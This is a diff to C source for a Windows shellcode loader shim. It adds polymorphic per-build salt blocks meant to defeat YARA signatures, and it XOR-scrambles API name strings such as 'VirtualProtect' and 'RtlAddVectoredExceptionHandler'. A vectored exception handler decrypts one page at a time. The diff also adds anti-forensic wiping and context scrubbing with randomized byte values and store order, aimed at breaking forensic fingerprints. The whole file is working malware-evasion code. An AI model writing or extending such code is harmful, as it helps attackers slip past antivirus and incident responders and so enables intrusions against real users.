@@ -24,6 +24,45 @@
 
 #define RVA2VA(type, base, rva) (type)((ULONG_PTR)(base) + (rva))
 
+/* Pull in the per-build polymorphism salt. SHIM_POLY_SALT is a 32-bit
+   per-build random value; different bits gate different optional code
+   blocks below. The blocks are no-ops at runtime (volatile reads/writes
+   the compiler must materialize but whose results are discarded), but
+   each #if branch emits different instruction sequences of different
+   total length - defeating wildcard-positioned YARA rules. */
+#if defined(__has_include)
+#  if __has_include("poly_seed.h")
+#    include "poly_seed.h"
+#  endif
+#endif
+#ifndef SHIM_POLY_SALT
+#  define SHIM_POLY_SALT 0u
+#endif
+#ifndef SHIM_STRING_XOR
+#  define SHIM_STRING_XOR 0xA5u
+#endif
+#ifndef SHIM_PEB_PICK
+#  define SHIM_PEB_PICK 0u
+#endif
+#ifndef SHIM_WIPE_BYTE
+#  define SHIM_WIPE_BYTE 0x00u
+#endif
+
+/* Scrub-value derivations from SHIM_WIPE_BYTE - wipe-byte replicated to
+   fill each width. Used for g_ctx field scrubbing; pointer fields are
+   cast from the 64-bit form. With SHIM_WIPE_BYTE=0 these become 0 and
+   match the original zero-scrub behavior. */
+#define SHIM_SCRUB_U32 ((uint32_t)((uint32_t)SHIM_WIPE_BYTE * 0x01010101u))
+#define SHIM_SCRUB_U64 ((uint64_t)((uint64_t)SHIM_WIPE_BYTE * 0x0101010101010101ULL))
+#define SHIM_SCRUB_PTR ((void *)(uintptr_t)SHIM_SCRUB_U64)
+
+/* Stack-built API strings are XOR-scrambled with SHIM_STRING_XOR per build
+   so literal "kernel32.dll" / "VirtualProtect" / "Rtl*VectoredException*"
+   never materialize on the stack or in the shim's compiled .text. The null
+   terminator is intentionally NOT XORed so string traversal still terminates.
+   shim_strcmp / shim_stricmp XOR the scrambled side back during compare. */
+#define SX(c) ((char)((unsigned char)(c) ^ SHIM_STRING_XOR))
+
 /* --- Shared VEH context --- */
 typedef struct {
     void     *loader_base;
@@ -36,11 +75,11 @@ typedef struct {
 
 /*
  * g_ctx lives at the end of .text so exe2h captures it.
- * Compiler uses RIP-relative addressing — works within same section.
+ * Compiler uses RIP-relative addressing - works within same section.
  */
 extern volatile VEH_CTX g_ctx;
 
-/* Sentinel values — generator patches these in the blob */
+/* Sentinel values - generator patches these in the blob */
 #define SENTINEL_LOADER_OFFSET  0xDEAD0001
 #define SENTINEL_LOADER_SIZE    0xDEAD0002
 #define SENTINEL_VEH_MODE       0xDEAD0003
@@ -63,7 +102,7 @@ static int    shim_strcmp(const char *a, const char *b);
 
 
 /* ================================================================
- * VehShimEntry — MUST be first function (offset 0 in .text).
+ * VehShimEntry - MUST be first function (offset 0 in .text).
  * Entered via fallthrough from XOR decoder. RCX = instance pointer.
  * ================================================================ */
 void VehShimEntry(void *inst, void *shim_base) {
@@ -73,9 +112,35 @@ void VehShimEntry(void *inst, void *shim_base) {
     volatile uint32_t pk_hi    = SENTINEL_PAGE_KEY_HI;
     volatile uint32_t pk_lo    = SENTINEL_PAGE_KEY_LO;
 
-    /* Stack-built strings — no static signatures in decoded shim */
-    char s_k32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
-    char s_vp[]  = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t',0};
+    /* Salt site 1 - XOR-cancel into ldr_off (gated on bit 0).
+       ldr_off is already volatile so the RMW pair cannot be folded;
+       the salt constant materializes as an immediate operand woven
+       into real load/store sequences against a real variable, not as
+       a recognizable dead-code block. */
+    #if (SHIM_POLY_SALT & 0x00000001u)
+    { uint32_t _s1 = ((uint32_t)SHIM_POLY_SALT >> 1) ^ 0xA5A50000u;
+      ldr_off ^= _s1; ldr_off ^= _s1; }
+    #endif
+
+    /* Salt site 2 - XOR-cancel (or ADD/SUB-cancel) into ldr_sz,
+       gated on bit 4. Nested bit 5 picks 32-bit XOR vs 16-bit
+       ADD/SUB body - different operand width, different opcodes. */
+    #if (SHIM_POLY_SALT & 0x00000010u)
+      #if (SHIM_POLY_SALT & 0x00000020u)
+      { uint32_t _s2 = ((uint32_t)SHIM_POLY_SALT << 7) ^ 0xDEADBEEFu;
+        ldr_sz ^= _s2; ldr_sz ^= _s2; }
+      #else
+      { uint16_t _s2 = (uint16_t)((SHIM_POLY_SALT >> 11) + 0xCAFEu);
+        ldr_sz += _s2; ldr_sz -= _s2; }
+      #endif
+    #endif
+
+    /* Stack-built strings - XOR-scrambled per build via SX(). Comparison
+       routines XOR the scrambled side back during compare. */
+    char s_k32[] = {SX('k'),SX('e'),SX('r'),SX('n'),SX('e'),SX('l'),
+                    SX('3'),SX('2'),SX('.'),SX('d'),SX('l'),SX('l'),0};
+    char s_vp[]  = {SX('V'),SX('i'),SX('r'),SX('t'),SX('u'),SX('a'),SX('l'),
+                    SX('P'),SX('r'),SX('o'),SX('t'),SX('e'),SX('c'),SX('t'),0};
 
     /* shim_base passed via RDX by the decoder's lea rdx,[rip] trampoline */
     void *loader_base = (char*)shim_base + ldr_off;
@@ -88,7 +153,7 @@ void VehShimEntry(void *inst, void *shim_base) {
 
     ULONG_PTR first_page  = (ULONG_PTR)loader_base & ~(ULONG_PTR)0xFFF;
     ULONG_PTR last_page   = ((ULONG_PTR)loader_base + ldr_sz - 1) & ~(ULONG_PTR)0xFFF;
-    SIZE_T    protect_len  = last_page - first_page + 0x1000;
+    volatile SIZE_T protect_len = last_page - first_page + 0x1000;
     DWORD     old;
 
     LoaderEntry_fn loader_entry = (LoaderEntry_fn)loader_base;
@@ -99,13 +164,16 @@ void VehShimEntry(void *inst, void *shim_base) {
         loader_entry(inst);
     } else {
         /* VEH sliding window with per-page encryption */
-        char s_ntdll[]  = {'n','t','d','l','l','.','d','l','l',0};
-        char s_addveh[] = {'R','t','l','A','d','d','V','e','c','t','o','r','e','d',
-                           'E','x','c','e','p','t','i','o','n','H','a','n','d','l',
-                           'e','r',0};
-        char s_remveh[] = {'R','t','l','R','e','m','o','v','e','V','e','c','t','o',
-                           'r','e','d','E','x','c','e','p','t','i','o','n','H','a',
-                           'n','d','l','e','r',0};
+        char s_ntdll[]  = {SX('n'),SX('t'),SX('d'),SX('l'),SX('l'),SX('.'),
+                           SX('d'),SX('l'),SX('l'),0};
+        char s_addveh[] = {SX('R'),SX('t'),SX('l'),SX('A'),SX('d'),SX('d'),
+                           SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
+                           SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
+                           SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0};
+        char s_remveh[] = {SX('R'),SX('t'),SX('l'),SX('R'),SX('e'),SX('m'),SX('o'),SX('v'),SX('e'),
+                           SX('V'),SX('e'),SX('c'),SX('t'),SX('o'),SX('r'),SX('e'),SX('d'),
+                           SX('E'),SX('x'),SX('c'),SX('e'),SX('p'),SX('t'),SX('i'),SX('o'),SX('n'),
+                           SX('H'),SX('a'),SX('n'),SX('d'),SX('l'),SX('e'),SX('r'),0};
 
         void *ntdll = shim_find_dll(s_ntdll);
         if (!ntdll) return;
@@ -113,7 +181,17 @@ void VehShimEntry(void *inst, void *shim_base) {
         RemVEH_fn pRemVEH = (RemVEH_fn)shim_get_export(ntdll, s_remveh);
         if (!pAddVEH || !pRemVEH) return;
 
-        uint64_t page_key = ((uint64_t)pk_hi << 32) | (uint64_t)pk_lo;
+        volatile uint64_t page_key = ((uint64_t)pk_hi << 32) | (uint64_t)pk_lo;
+
+        /* Salt site 3 - XOR-cancel into page_key, gated on bit 8.
+           page_key is volatile so the cancel pair is preserved.
+           Salt is mixed via mul + xor for a wider emitted operand
+           (REX.W + 64-bit immediate path). */
+        #if (SHIM_POLY_SALT & 0x00000100u)
+        { uint64_t _s3 = ((uint64_t)SHIM_POLY_SALT << 13) ^ 0xC0FFEEBABEDEADAULL;
+          _s3 *= 0x9E3779B97F4A7C15ULL;   /* fractional bits of phi */
+          page_key ^= _s3; page_key ^= _s3; }
+        #endif
 
         g_ctx.loader_base       = loader_base;
         g_ctx.loader_size       = ldr_sz;
@@ -128,27 +206,79 @@ void VehShimEntry(void *inst, void *shim_base) {
 
         PVOID veh_handle = pAddVEH(1, SlidingVehHandler);
 
-        /* First instruction of loader faults — VEH decrypts page 0 */
+        /* First instruction of loader faults - VEH decrypts page 0 */
         loader_entry(inst);
 
         if (veh_handle) pRemVEH(veh_handle);
 
-        /* Wipe all loader pages — anti-forensics */
+        /* Salt site 4 - XOR/ADD-cancel into protect_len, gated on bit 12.
+           Nested bits 13-14 pick three body shapes of different operand
+           widths (32-bit XOR / 64-bit ADD-SUB / 8-bit XOR) - same null
+           net effect, different emitted opcodes. protect_len is volatile
+           so the cancel pair survives -Os. */
+        #if (SHIM_POLY_SALT & 0x00001000u)
+          #if (SHIM_POLY_SALT & 0x00002000u)
+            { uint32_t _s4 = SHIM_POLY_SALT ^ 0x13371337u;
+              _s4 = (_s4 + 0x9E3779B9u) ^ (_s4 << 5);
+              protect_len ^= (SIZE_T)_s4; protect_len ^= (SIZE_T)_s4; }
+          #elif (SHIM_POLY_SALT & 0x00004000u)
+            { uint64_t _s4 = ((uint64_t)SHIM_POLY_SALT * 0xFFFFFFFFu) + 0xBADCAFEu;
+              protect_len += (SIZE_T)_s4; protect_len -= (SIZE_T)_s4; }
+          #else
+            { uint8_t _s4 = (uint8_t)((SHIM_POLY_SALT >> 19) ^ 0x5A);
+              protect_len ^= (SIZE_T)_s4; protect_len ^= (SIZE_T)_s4; }
+          #endif
+        #endif
+
+        /* Wipe all loader pages - anti-forensics. Per-build wipe byte
+           (SHIM_WIPE_BYTE from gen_poly) defeats the "freshly-zeroed
+           multi-page RWX region near the still-mapped shim" forensic
+           anchor. Data is destroyed regardless of byte value. */
         pVP((void*)first_page, protect_len, PAGE_READWRITE, &old);
         {
             uint8_t *w = (uint8_t *)first_page;
-            for (SIZE_T z = 0; z < protect_len; z++) w[z] = 0;
+            for (SIZE_T z = 0; z < protect_len; z++) w[z] = SHIM_WIPE_BYTE;
         }
 
-        /* Scrub VEH context */
-        g_ctx.loader_base       = 0;
-        g_ctx.loader_size       = 0;
-        g_ctx.pfnVirtualProtect = 0;
-        g_ctx.last_rx_page      = 0;
-        g_ctx.page_master_key   = 0;
-        g_ctx.page_encrypted    = 0;
+        /* Scrub VEH context - Q3+Q4: per-build pattern (SHIM_WIPE_BYTE
+           replicated per field width) breaks the "all-zero VEH_CTX"
+           forensic fingerprint, AND the 6 scrub stores are emitted in
+           one of 4 orderings picked from SHIM_POLY_SALT bits 16-17.
+           g_ctx is volatile, so each store is preserved. Safe because
+           g_ctx is never referenced after this block. */
+        #define SCRUB_LDR_BASE() (g_ctx.loader_base       = SHIM_SCRUB_PTR)
+        #define SCRUB_VP()       (g_ctx.pfnVirtualProtect = SHIM_SCRUB_PTR)
+        #define SCRUB_RX_PAGE()  (g_ctx.last_rx_page      = SHIM_SCRUB_PTR)
+        #define SCRUB_LDR_SIZE() (g_ctx.loader_size       = SHIM_SCRUB_U32)
+        #define SCRUB_PG_ENC()   (g_ctx.page_encrypted    = SHIM_SCRUB_U32)
+        #define SCRUB_PG_KEY()   (g_ctx.page_master_key   = SHIM_SCRUB_U64)
+
+        #if   ((SHIM_POLY_SALT >> 16) & 0x3u) == 0u
+          /* Order 0 - original declaration sequence */
+          SCRUB_LDR_BASE(); SCRUB_VP(); SCRUB_RX_PAGE();
+          SCRUB_LDR_SIZE(); SCRUB_PG_ENC(); SCRUB_PG_KEY();
+        #elif ((SHIM_POLY_SALT >> 16) & 0x3u) == 1u
+          /* Order 1 - reverse */
+          SCRUB_PG_KEY(); SCRUB_PG_ENC(); SCRUB_LDR_SIZE();
+          SCRUB_RX_PAGE(); SCRUB_VP(); SCRUB_LDR_BASE();
+        #elif ((SHIM_POLY_SALT >> 16) & 0x3u) == 2u
+          /* Order 2 - pointers first, then numerics */
+          SCRUB_LDR_BASE(); SCRUB_RX_PAGE(); SCRUB_VP();
+          SCRUB_PG_KEY(); SCRUB_LDR_SIZE(); SCRUB_PG_ENC();
+        #else
+          /* Order 3 - numerics first, then pointers (interleaved) */
+          SCRUB_PG_ENC(); SCRUB_LDR_SIZE(); SCRUB_PG_KEY();
+          SCRUB_VP(); SCRUB_RX_PAGE(); SCRUB_LDR_BASE();
+        #endif
+
+        #undef SCRUB_LDR_BASE
+        #undef SCRUB_VP
+        #undef SCRUB_RX_PAGE
+        #undef SCRUB_LDR_SIZE
+        #undef SCRUB_PG_ENC
+        #undef SCRUB_PG_KEY
     }
-    /* Note: we can't drop X from the shim page here — the function epilogue
+    /* Note: we can't drop X from the shim page here - the function epilogue
        (pop rbp / ret) still needs to execute on this page after we return.
        VEH is deregistered and g_ctx is scrubbed; the 4KB RWX shim page is
        the residual footprint. */
@@ -164,7 +294,7 @@ static void xor_page(void *page_addr, uint64_t master_key, uint32_t page_index) 
 }
 
 /* ================================================================
- * VEH Handler — decrypts/re-encrypts a 1-page RX window across
+ * VEH Handler - decrypts/re-encrypts a 1-page RX window across
  * the loader. Only one page of cleartext exists at any time.
  * ================================================================ */
 static LONG CALLBACK SlidingVehHandler(PEXCEPTION_POINTERS ep) {
@@ -215,12 +345,23 @@ static void *shim_find_dll(char *dll_name) {
     PPEB peb = GET_PEB();
     PPEB_LDR_DATA ldr = peb->Ldr;
 
+    /* Per-build PEB list pick - mirrors loader's 1-of-2 selection.
+       Both lists contain kernel32 and ntdll (the only DLLs we resolve). */
+#if SHIM_PEB_PICK
+    PLIST_ENTRY head  = &ldr->InInitializationOrderModuleList;
+#else
     PLIST_ENTRY head  = &ldr->InMemoryOrderModuleList;
+#endif
     PLIST_ENTRY entry = head->Flink;
 
     while (entry != head) {
+#if SHIM_PEB_PICK
+        PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
+            (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InInitializationOrderLinks);
+#else
         PLDR_DATA_TABLE_ENTRY dte = (PLDR_DATA_TABLE_ENTRY)(
             (PBYTE)entry - (ULONG_PTR)&((PLDR_DATA_TABLE_ENTRY)0)->InMemoryOrderLinks);
+#endif
 
         if (dte->DllBase != 0) {
             PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dte->DllBase;
@@ -259,9 +400,14 @@ static void *shim_get_export(void *base, char *api_name) {
     return 0;
 }
 
+/* Convention: a = plaintext (from PEB module name / export name table),
+   b = scrambled stack-built string. XOR b's char with SHIM_STRING_XOR
+   to recover its plaintext for comparison. The null terminator is NOT
+   scrambled, so loop termination works naturally. */
 static int shim_stricmp(const char *a, const char *b) {
     while (*a && *b) {
-        if ((*a | 0x20) != (*b | 0x20)) return 1;
+        char bc = (char)((unsigned char)*b ^ SHIM_STRING_XOR);
+        if ((*a | 0x20) != (bc | 0x20)) return 1;
         a++; b++;
     }
     return (*a != *b) ? 1 : 0;
@@ -269,12 +415,19 @@ static int shim_stricmp(const char *a, const char *b) {
 
 static int shim_strcmp(const char *a, const char *b) {
     while (*a && *b) {
-        if (*a != *b) return 1;
+        char bc = (char)((unsigned char)*b ^ SHIM_STRING_XOR);
+        if (*a != bc) return 1;
         a++; b++;
     }
     return (*a != *b) ? 1 : 0;
 }
 
 /* g_ctx in .text so exe2h captures it. Placed after all functions. */
+#ifdef _MSC_VER
+#pragma section(".text", read, write, execute)
+__declspec(allocate(".text"))
+volatile VEH_CTX g_ctx = { 0, 0, 0, 0, 0, 0 };
+#else
 __attribute__((section(".text"), used))
 volatile VEH_CTX g_ctx = { 0, 0, 0, 0, 0, 0 };
+#endif
